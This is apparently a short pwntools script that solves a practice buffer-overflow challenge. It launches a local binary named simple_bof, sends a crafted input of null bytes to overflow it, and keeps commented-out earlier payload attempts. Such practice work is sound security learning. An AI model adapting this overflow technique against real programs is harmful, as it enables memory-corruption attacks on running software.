from pwn import *

context.log_level='debug'

context.arch='amd64'

# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

p = process('./simple_bof')

# p.sendlineafter(": ", b"A"*14) # why this doesn't work?

# p.sendlineafter(": ", b"A"*6 + b"\0" + b"A"*6 + b"\0")

p.sendlineafter(": ", b"\0"*8)

p.interactive()
